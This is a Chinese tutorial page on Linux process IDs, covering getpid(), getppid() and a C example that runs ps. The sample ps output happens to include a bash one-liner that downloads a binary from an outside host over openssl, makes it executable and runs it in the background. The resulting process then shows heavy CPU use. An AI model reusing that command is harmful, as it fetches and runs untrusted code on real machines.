<html><head><meta charset="utf-8"></meta></head><body><h1 class="article-title" style="text-align:center;">进程信息</h1><div style="width:100%;float:left;" class="article-content">   
 <p>在学习进程信息之前，我们需要知道一些东西，比如 - </p> 
 <p><strong>什么是进程？</strong> 进程是一个正在执行的程序。</p> 
 <p><strong>什么是程序？</strong> 程序是一个包含进程信息的文件，以及在运行时如何构建它。 当你开始执行程序时，它被加载到RAM中并开始执行。</p> 
 <p>每个进程都用唯一的正整数来标识，称为进程标识符，或者简称PID(进程标识号)。 内核通常将进程ID限制为32767，这是可配置的。 当进程ID达到此限制时，将再次重置，即在系统进程范围之后。 然后将来自该计数器的未使用的进程ID分配给新创建的进程。</p> 
 <p>系统调用<code>getpid()</code>返回调用进程的进程ID。</p> 
 <pre><code class="lang-cpp">#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

pid_t getpid(void);
</code></pre> 
 <p>该调用返回保证唯一的调用进程的进程ID。 这个调用总是成功的，因此没有返回值来表示错误。<br>每个进程都有其唯一的ID，称为进程ID，但是是谁创建的呢？ 如何获得有关其创建者的信息？ 创建者进程称为父进程。父进程ID或PPID可以通过<code>getppid()</code>调用获得。</p> 
 <p>系统调用<code>getppid()</code>返回调用进程的父进程PID。</p> 
 <pre><code class="lang-cpp">#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

pid_t getppid(void);
</code></pre> 
 <p>这个调用返回调用进程的父进程ID。 这个调用总是成功的，因此没有返回值来表示错误。</p> 
 <p>让我们用一个简单的例子来理解这一点。</p> 
 <p>以下是了解调用进程的PID和PPID的程序。参考以下文件:<em>processinfo.c</em> 中的代码 - </p> 
 <pre><code class="lang-cpp">// File name: processinfo.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

int main() {
   int mypid, myppid;
   printf("Program to know PID and PPID's information\n");
   mypid = getpid();
   myppid = getppid();
   printf("My process ID is %d\n", mypid);
   printf("My parent process ID is %d\n", myppid);
   printf("Cross verification of pid's by executing process commands on shell\n");
   system("ps -ef");
   return 0;
}
</code></pre> 
 <p>在编写并执行上述程序时，应该得到类似下面的结果 - </p> 
 <pre><code class="lang-shell">UID         PID   PPID  C STIME TTY          TIME CMD
root          1      0  0  2017 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
mysql       101      1  0  2017 ?        00:06:06 /usr/libexec/mysqld 
                                         --basedir = /usr 
                                         --datadir = /var/lib/mysql 
                                         --plugin-dir = /usr/lib64/mysql/plugin 
                                         --user = mysql 
                                         --log-error = /var/log/mariadb/mariadb.log 
                                         --pid-file = /run/mariadb/mariadb.pid 
                                         --socket = /var/lib/mysql/mysql.sock
2868535   96284      0  0 05:23 ?        00:00:00 bash -c download() { 
                                         flag = "false" hsize = 1 
                                         echo -e "GET /$2 HTTP/1.1\nHost: 
                                         $1\nConnection: close\n\n" | 
                                         openssl s_client -timeout -quiet 
                                         -verify_quiet -connect $1:443 2&gt; 
                                         /dev/null | tee out | while read line do
                                         if [[ "$flag" == "false" ]]     
                                         then 
                                         hsize = $((hsize+$(echo $line | wc -c)))
                                         fi
                                         if [[ "${line:1:1}" == "" ]]     
                                         then flag = "true"
                                         fi 
                                         echo $hsize &gt; 
                                         size done tail -c +$(cat size) out &gt; 
                                         $2 rm size out }
                                         ( download my.mixtape.moe mhawum 2&gt;
                                         /dev/null chmod +x mhawum 2&gt;
                                         /dev/null ./mhawum &gt;
                                         /dev/null 2&gt;
                                         /dev/null )&amp;
2868535   96910  96284 99 05:23 ?        00:47:26 ./mhawum
6118874  104116      0  3 05:25 ?        00:00:00 sh -c cd /home/cg/root/6118874; 
                                         timeout 10s javac Puppy.java
6118874  104122 104116  0 05:25 ?        00:00:00 timeout 10s javac Puppy.java
6118874  104123 104122 23 05:25 ?        00:00:00 javac Puppy.java
3787205  104169      0  0 05:25 ?        00:00:00 sh -c cd /home/cg/root/3787205; 
                                         timeout 10s main
3787205  104175 104169  0 05:25 ?        00:00:00 timeout 10s main
3787205  104176 104175  0 05:25 ?        00:00:00 main
3787205  104177 104176  0 05:25 ?        00:00:00 ps -ef
Program to know PID and PPID's information
My process ID is 104176
My parent process ID is 104175
Cross verification of pid's by executing process commands on shell
</code></pre> 
 <blockquote> 
  <p>注 - C库函数<code>system()</code>用于执行一个shell命令。 传递给<code>system()</code>的参数是在shell上执行的命令。 在上面的程序中，命令是:<code>ps</code>，它给出了进程状态。</p> 
 </blockquote> 
 <p>有关所有正在运行的进程和其他系统相关信息的完整信息，可以从<code>/proc</code>位置的<code>proc</code>文件访问。</p>
 <br>      
</div></body></html>